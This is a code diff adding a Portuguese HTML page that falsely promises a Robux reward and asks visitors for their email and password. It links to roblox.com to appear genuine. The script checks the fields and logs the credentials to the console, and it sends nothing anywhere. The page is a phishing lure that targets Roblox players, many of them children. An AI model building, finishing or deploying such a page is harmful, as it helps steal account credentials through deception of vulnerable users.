@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>Document</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+   <main>
+
+      <div class="Titulo">
+         <h2>Regaste Robux!</h2>
+      </div>
+      <div class="InfoEspaco">
+         <div class="info">
+            <p>
+               Olá! 👋 <br>
+               <br>
+               Seu resgate está quase concluído! 💰 Para garantir que<br>
+               você receba seu robux sem problemas, basta preencher<br>
+               o formulário abaixo com as informações necessárias.<br>
+               <br>
+               Se precisar de ajuda, estamos aqui para te <strong><a href="https://www.roblox.com/" target="_blank" class="Ajuda">ajudar</a></strong>.🚀<br>
+               <br>
+               Preencha os dados e aproveite seu saldo! ✅
+            </p>
+         </div>
+      </div>
+
+      <div class="formulario">
+         <h2>Preencha os dados</h2>
+         <div class="email">
+            <p id="ErrorEmail">Email</p>
+            <div class="emailinput"><input type="text" placeholder="Email" id="emailI"></div>
+         </div>
+         <div class="Senha">
+            <p id="ErrorSenha">Senha</p>
+            <div class="SenhaInput"><input type="password" placeholder="Senha" id="senha"></div>
+         </div>
+      </div>
+      <div class="ErrorForm">
+         <p id="Error"></p>
+      </div>
+      <div class="LocalButao"><button id="resgata">Resgatar</button></div>
+   </main>
+   <script>
+      function ErradoStr(e, s) {
+         console.log(e, s)
+         if (s && e) {
+            return "Os campos de e-mail e senha estão vazios."
+         }  
+         else if (s && !e) {
+            return "O campo de senha está vazio."
+         } 
+         else if (!s && e) {
+            return "O campo de e-mail está vazio."
+         }
+         else {
+            console.log('chico butico')
+         }
+      }
+
+
+      //inputs
+      const inputEmail = window.document.getElementById('emailI')
+      const inputSenha = window.document.getElementById('senha')
+      //Text ERROR
+      const textEmail = window.document.getElementById('ErrorEmail')
+      const textSenha = window.document.getElementById('ErrorSenha')
+      const DivError = window.document.querySelector('.ErrorForm')
+      const ErrorCampo = window.document.getElementById('Error') // texto
+      let error = false
+      //Botao
+      let Botao = window.document.getElementById('resgata')
+      Botao.addEventListener('click', function () {
+         let email = inputEmail.value
+         let senha = inputSenha.value
+         //vazios
+         let Vemail = false
+         let Vsenha = false
+
+         if (email == '' || senha == '') {
+            if (senha == '') {
+               textSenha.innerHTML = 'Senha<strong class="error">*</strong>'
+               Vsenha = true
+            }
+            if (email == '') {
+               textEmail.innerHTML = 'Email<strong class="error">*</strong>'
+               Vemail = true
+            }
+            if (!error) {
+               DivError.style.animation = 'error 0.5s ease-in-out 1 forwards'
+            }
+            error = true
+            console.log(ErradoStr(Vemail, Vsenha))
+            ErrorCampo.innerText = ErradoStr(Vemail, Vsenha)
+         }
+         if (email != '' || senha != '') {
+            //Retirar o Text Error paeeeeeeeeeee
+            if (email != '') {
+               textEmail.innerText = 'Email'
+            }
+            if (senha != '') {
+               textSenha.innerText = 'Senha'
+            }
+         }
+         if (email != '' && senha != '') {
+            if (error) {
+               setTimeout(() => {
+                  DivError.style.animation = 'Dbug 0.5s ease-in-out 1 forwards'
+                  ErrorCampo.innerHTML = ''
+               }, 1000)
+               error = false
+            }
+            console.log(`Email: ${email}\nSenha: ${senha}`)
+         }
+      })
+   </script>
+</body>
+</html>
